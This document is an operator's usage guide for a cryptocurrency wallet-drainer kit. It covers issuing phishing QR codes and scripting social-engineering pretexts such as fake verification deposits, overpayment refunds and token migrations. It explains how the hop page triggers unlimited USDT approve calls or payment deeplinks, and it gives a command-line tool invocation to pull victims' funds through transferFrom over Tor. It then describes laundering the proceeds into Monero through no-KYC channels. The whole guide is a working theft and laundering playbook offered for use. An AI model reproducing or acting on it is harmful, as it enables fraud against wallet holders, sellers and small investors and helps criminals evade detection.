# Holocaust Drainer — usage.md
A full operational walkthrough. Operators are simulated end-to-end: login →
QR issuance → victim social engineering → what the victim actually sees
(traced strictly from the real source code) → settlement → laundering to XMR.

---

## 1. Operator: log in and issue a fresh QR

1. From Tor Browser, open `http://YOUR.onion/login`, enter your passphrase.
2. Dashboard → **Set / update a receiver** for the chain you intend to drain
   (e.g. Ethereum `0x…` receiver for USDT). The address is validated
   server-side (checksum/format) before it is accepted.
3. **Open QR generator** and fill:
   - Static hosting domain: a FRESH free static host (e.g. `https://calm-bassi-9f3a2c.netlify.app`)
   - Chain: `Ethereum`
   - Mode:
     - `pay` — victim sends a fixed amount now (USDT default). Best for
       one-shot deposits.
     - `approve` — victim grants your receiver EOA a MaxUint256 allowance.
       Everything stays drainable until they revoke. Highest yield.
4. Submit. The panel returns:
   - the QR (fresh signed token — every generation is unique, no reuse),
   - the exact upload path: `p/<token>/index.html`,
   - the complete self-contained hop-page HTML to copy-paste.
5. Upload the HTML at that exact path on your static host. Scan-test with a
   clean device (full test procedure: `verify.md` — required before first
   live use, no burner phone needed). Distribute the QR.

Rotation rule: new campaign → new domain + new QR. The old token keeps working
until you retire the static page (no server-side state exists to expire).

---

## 2. Pretexts (choose per target profile)

The QR is the payload; the pretext is what makes the victim scan it.

**A. The $1 verification micro-deposit (approve mode, universal)**
Persona: marketplace/escrow "verification bot" or OTC desk compliance.
"Before a large OTC trade, the desk requires wallet verification. Scan the
QR, your wallet will show a security check — confirm it. It's read-only, no
funds move." The victim sees the wallet's own prompt (see §3) and a UI that
never once mentions an external website. The approve is the entire theft;
there is no second step they could notice.
Follow-up drain: after the allowance, you push `transferFrom` whenever the
wallet refills — they often wake up only after multiple passes.

**B. The overpayment refund (pay mode, e-commerce/P2P sellers)**
Persona: eager buyer with "a payroll issue."
"My company policy forces me to pay from a wallet with a matching name. Scan
this, you'll get the release request — I accidentally sent you 520 instead of
350, please just send the difference back after it lands."
QR amount: a realistic product+overage figure. What lands is a normal USDT
transfer prompt the victim confirms. You receive the "refund" they send after
you (optionally) send a small real overpayment from a second wallet.

**C. The airdrop/migration claim (approve mode, retail holders)**
Persona: support staff of a token with a (manufactured) migration.
"V2 migration requires a one-time wallet authorization. Scan, confirm the
check in your wallet, then your tokens migrate automatically."
The hop page shows a clean "Verifying payment capability" screen, so the
flow reads as a security ritual, not a transaction.

**D. The deposit-before-withdrawal (pay mode, small gamblers)**
Persona: investment-group admin in a Telegram chat.
"To withdraw your profit you must show a refundable 49.99 USDT intent deposit.
Scan, send, the 49.99 returns with your payout."
Amounts under ~$50 are the sweet spot: no one disputes, no one investigates,
and volume compensates.

Tone rules (all pretexts): no urgency clichés ("last chance"), no broken
English, never mention wallets-by-name, never explain blockchain mechanics.
The more procedural you sound, the more the QR feels like paperwork.

---

## 3. What the victim sees (traced from the actual code)

This section describes only what the shipped code does — nothing invented.

1. Victim scans the QR with their phone camera or in-wallet scanner. The QR
   decodes to `https://<your-domain>/p/<token>` — a normal HTTPS link. No
   IP-grabber, no redirect chain visible, nothing but your static host.
2. The page opens: dark background, a spinner, the headline
   **"Verifying payment capability"** and the line *"This is a read-only
   security check performed by your wallet. Please confirm the request it
   shows you."* — exactly what `buildHopPage()` renders.
3. From here two paths, both set by the mode you generated:
   - **approve mode, EVM, wallet with dApp browser (Trust, MetaMask in-app):**
     the page calls the wallet's injected provider
     (`eth_requestAccounts`), then pops `eth_sendTransaction` prompts on the
     well-known USDT (and optionally USDC/DAI) contracts with calldata
     `0x095ea7b3 || <receiver> || ffff…ff` — i.e. standard
     `approve(receiver, MaxUint256)`. The wallet displays its own regular
     allowance dialog for the USDT contract. No drainer contract name ever
     appears because no drainer contract exists — the spender is your plain
     receiving address.
   - **pay mode:** the page (or the wallet, if the provider isn't available)
     routes to the vendor deeplinks: `metamask.app.link/send/<EIP-681
     transfer>` or `link.trustwallet.com/payment?asset=…&address=…&amount=…`
     (plus `solana:` URIs for Solana payloads). The victim's wallet shows its
     own normal "send X USDT to 0x…" screen with the amount pre-filled.
4. After confirming, the victim sees the spinner stop mattering — the page
   has nothing more to say (it never phones home; there is no success/failure
   feedback by design). To the victim the interaction was: scan → wallet
   prompt → done. The page itself made no network requests except loading
   from the static host once.

Why nothing trips: the domain is fresh HTTPS static hosting; the only
third-party domains in play are the wallet vendors' own deeplink domains; the
prompt the victim approves is generated by their own wallet, not a webpage.

---

## 4. Settlement: watching the money arrive

- pay mode: transfers land directly on the receiver address. Reconcile by
  scanning incoming transactions to your receiver on a block explorer
  (from a VPN/Tor session, never your daily browser profile).
- approve mode: nothing lands until you pull. Use the bundled tool:
  ```
  ./drain -key <receiver-eoa-privkey> -rpc https://<public-rpc> \
          -chain eth-1 -from <victim> -to <receiver> \
          -token 0xdAC17F958D2ee523a2206206994597C13D831ec7 -amount all
  ```
  It reads balance + allowance on-chain, then prints (or with `-send`,
  broadcasts) a signed EIP-155 `transferFrom` — signing path proven against
  the canonical EIP-155 vector. Gas/nonce are fetched automatically; per-pull
  cost is one plain transferFrom (trivial on BNB/Polygon/Base, batch on
  Ethereum mainnet). No config files, no logs, everything on the CLI — run
  it through torsocks.

Gas tip (approve mode): keep the receiver EOA's native balance minimal but
non-zero; per-pull cost is a single 21k-2× transferFrom, trivial on
BNB/Polygon/Base, noticeable on Ethereum mainnet — mainnet pulls should be
batched (few, large).

---

## 5. Laundering on-chain → XMR

Assumptions: receivers are fresh wallets not linked to your identity; you
have a Monero wallet (Feather/GUI, keys you control).

1. **Cooling:** leave inflows parked per-campaign. Do not forward instantly;
   amount- and time-correlation is the enemy. Hours to a day is typically
   enough for sub-$5k flows; longer for larger.
2. **Aggregation:** sweep each receiver into a single holding wallet of the
   same chain. Use fresh per-campaign receivers so the holding wallet is the
   only common node.
3. **Conversion to XMR (no-KYC paths, in order of preference):**
   a. P2P with a trusted counterparty from the darknet forums (deal size
      matched to counterparty reputation; escrowed by the forum).
   b. A decentralized/exchange-less swap service that supports ETH→XMR and
      has no accounts (research current services at operation time; they
      appear/disappear). Send from the holding wallet, receive at your XMR
      wallet.
   c. DEX into a privacy token hop, then swap to XMR — only if a and b are
      unavailable; it multiplies traces and fees.
4. **After conversion:** XMR transfers are private by default; split the
   output across 2–3 XMR subaddresses, let the wallet's rings do the rest.
5. **Cash-out** (only when needed, in fiat-sized chunks, from the XMR side
   through whatever exit you trust; never convert back on a KYC exchange
   with the same XMR outputs that touched the drain).

Hard no's: do not send drain proceeds directly to any KYC'd exchange; do not
reuse a receiver across campaigns (on-chain clustering will eventually link
campaigns you thought were separate); do not move the full balance at once.

---

## 6. Timeline of a clean operation (summary)

```
T+0    new static domain + new QR issued; receiver saved for the chain
T+0    hop page uploaded at p/<token>/index.html; test-scan OK
T+0+   QR distributed under pretext A/B/C/D
T+v    victim scans; wallet prompt; approve/pay confirmed
T+v+1d (approve) allowance drained via transferFrom
T+cool sweep receivers -> holding wallet
T+cool swap -> XMR (P2P/no-KYC), split outputs
T+end  retire static page, mark token dead by moving on (new domain next op)
```
